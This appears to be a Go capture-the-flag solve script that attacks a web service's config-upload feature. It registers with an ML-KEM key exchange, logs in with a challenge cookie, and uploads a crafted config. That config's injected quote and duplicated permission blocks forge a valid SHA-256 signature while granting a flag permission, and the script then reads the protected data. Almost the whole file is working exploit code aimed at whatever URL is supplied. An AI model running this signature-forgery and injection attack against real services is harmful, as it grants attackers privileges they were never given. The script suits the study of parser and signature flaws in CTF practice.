package main

import (
	"bytes"
	"crypto/mlkem"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
)

var signatureEvil1 = `:a:b"
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
💬:true:false:false:c`
var signatureEvil2 = `:a:b:true:false:true:c`
var configEvil = `::userℹ️::
my♥️🍏a
what_a_website🍏b'"
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
💬'
🍎
::permissions::
write🍏True
read🍏False
flag🚩🍏False
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏c
`

var signatureBasic = `:a:b:true:true:false:c`
var configBasic = `::userℹ️::
my♥️🍏a
what_a_website🍏b
🍎
::permissions::
write🍏True
read🍏True
🍎
::URL::
::endpoint::🍏c
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
`

var sharedSecret = hex.DecodedLen
var signatureExample = `:I love unicode and go:https://youtu.be/DvR6-SQzqO8:false:true:false:NA`
var configExample = `::userℹ️::
my♥️🍏I love unicode and go
what_a_website🍏https://youtu.be/DvR6-SQzqO8
🍎
::permissions::
write🍏False
read🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏%s
🍎
::URL::
::endpoint::🍏NA
`

type Client struct {
	url      string
	username string
	name     string
	email    string
	cookie   *http.Cookie
}

func (c *Client) Register() ([]byte, error) {
	dk, err := mlkem.GenerateKey768()
	if err != nil {
		log.Fatal(err)
	}
	encapsulationKey := dk.EncapsulationKey().Bytes()

	val := url.Values{}
	val.Add("username", c.username)
	val.Add("name", c.name)
	val.Add("email", c.email)
	val.Add("encapsulationKey", string(encapsulationKey))
	resp, err := http.PostForm(c.url+"/register", val)
	if err != nil {
		return nil, fmt.Errorf("error post register: %w", err)
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("invalid request: %s", string(body))
	}

	sharedSecret, err := dk.Decapsulate(body)
	if err != nil {
		return nil, err
	}
	return sharedSecret, nil
}

func (c *Client) Login(sharedSecret []byte) error {
	val := url.Values{}
	val.Add("username", c.username)
	resp, err := http.PostForm(c.url+"/login", val)
	if err != nil {
		return fmt.Errorf("error get current challenge: %w", err)
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("invalid request: %s", string(body))
	}

	c.cookie = c.MakeChallenge(sharedSecret, body)

	return nil

}

func (c *Client) MakeChallenge(sharedSecret []byte, challenge []byte) *http.Cookie {
	fmt.Println(hex.EncodeToString(challenge), hex.EncodeToString(sharedSecret), c.username)
	a := append(append(challenge, sharedSecret...), c.username...)
	hashChallenge := sha256.Sum256(a)
	return &http.Cookie{
		Name:     "serialize_auth",
		Value:    hex.EncodeToString(hashChallenge[:]),
		Secure:   true,
		HttpOnly: true,
	}
}

func (c *Client) makePost(val string, path string) error {
	req, err := http.NewRequest("POST", c.url+"/"+path, bytes.NewBufferString(val))
	if err != nil {
		return fmt.Errorf("error create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if c.cookie != nil {
		req.AddCookie(c.cookie)
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error post: %w", err)
	}

	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("error reading body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("invalid request: %s", string(body))
	}

	fmt.Printf("body: %v\n", string(body))

	return nil

}

func (c *Client) Logout() error {
	val := "username=" + c.username
	return c.makePost(val, "logout")
}

func (c *Client) UploadConfigExample() error {
	config := `::userℹ️::
my♥️🍏I love unicode and go
what_a_website🍏https://youtu.be/DvR6-SQzqO8
🍎
::permissions::
write🍏False
read🍏True
🍎
::✍️signature✍️
method🍏sha256
hash🍏3f0e062c925c56172b59f1096f8e4bd76f293a73dc055b3f0a5cd1f3a7d50e93
🍎
::URL::
::endpoint::🍏NA
`
	val := "username=" + c.username + "&config=" + hex.EncodeToString([]byte(config))
	return c.makePost(val, "upload_config")
}

func (c *Client) UploadConfigExploit(sharedSecret []byte) error {
	key2 := append(sharedSecret, []byte(signatureEvil2)...)
	hash2 := sha256.Sum256(key2)
	hexHash2 := hex.EncodeToString(hash2[:])
	fmt.Printf("\n-----------------------\nkey2: %v\n-----------------------\n", string(key2))

	key1 := append(sharedSecret, fmt.Appendf([]byte{}, signatureEvil1, hexHash2)...)
	fmt.Printf("\n-----------------------\nkey1: %v\n-----------------------\n", string(key1))
	hash1 := sha256.Sum256(key1)

	config := fmt.Sprintf(configEvil, hexHash2, hex.EncodeToString(hash1[:]))
	fmt.Printf("config: %v\n", config)
	val := "username=" + c.username + "&config=" + hex.EncodeToString([]byte(config))
	return c.makePost(val, "upload_config")
}

func (c *Client) WriteBook() error {
	val := "username=" + c.username
	val += "&entry=test entry"
	return c.makePost(val, "write_book")
}

func (c *Client) ReadBook() error {
	val := "username=" + c.username
	return c.makePost(val, "read_book")
}

func Exploit(url string) {
	client := Client{
		url:      url,
		username: rand.Text(),
		name:     "Administartor",
		email:    "admin@gmail.com",
	}

	fmt.Println("Register: " + client.username)
	sharedSecret, err := client.Register()
	if err != nil {
		log.Fatalln(fmt.Errorf("register failed: %w", err))
	}

	fmt.Println("Login")
	if err := client.Login(sharedSecret); err != nil {
		log.Fatalln(fmt.Errorf("failed to login: %w", err))
	}

	fmt.Println("UploadConfig")
	if err := client.UploadConfigExploit(sharedSecret); err != nil {
		log.Fatalln(fmt.Errorf("upload config failed: %w", err))
	}

	fmt.Println("Logout")
	if err := client.Logout(); err != nil {
		log.Fatalln(fmt.Errorf("logout failed: %w", err))
	}

	fmt.Println("Login")
	if err := client.Login(sharedSecret); err != nil {
		log.Fatalln(fmt.Errorf("failed to login: %w", err))
	}

	fmt.Println("ReadBook")
	if err := client.ReadBook(); err != nil {
		log.Fatalln(fmt.Errorf("read book failed: %w", err))
	}
}

func Example(url string) {
	client := Client{
		url:      url,
		username: "john",
		name:     "Administartor",
		email:    "admin@gmail.com",
	}

	sharedSecret, err := hex.DecodeString("abf6a74a379460e6872efa0b5f2b0095f858a8f2dbf885f4392bf640b53a711c")
	if err != nil {
		panic(err)
	}

	fmt.Println("Login")
	if err := client.Login(sharedSecret); err != nil {
		log.Fatalln(fmt.Errorf("failed to login: %w", err))
	}

	fmt.Println("UploadConfig")
	if err := client.UploadConfigExample(); err != nil {
		log.Fatalln(fmt.Errorf("upload config failed: %w", err))
	}

	fmt.Println("ReadBook")
	if err := client.ReadBook(); err != nil {
		log.Fatalln(fmt.Errorf("read book failed: %w", err))
	}
}

func main() {
	targetURL := flag.String("url", "", "The URL of the target (required)")
	flag.Parse()

	if *targetURL == "" {
		log.Fatal("The -url flag is required")
	}

	Exploit(*targetURL)
	// Example(*targetURL)
}
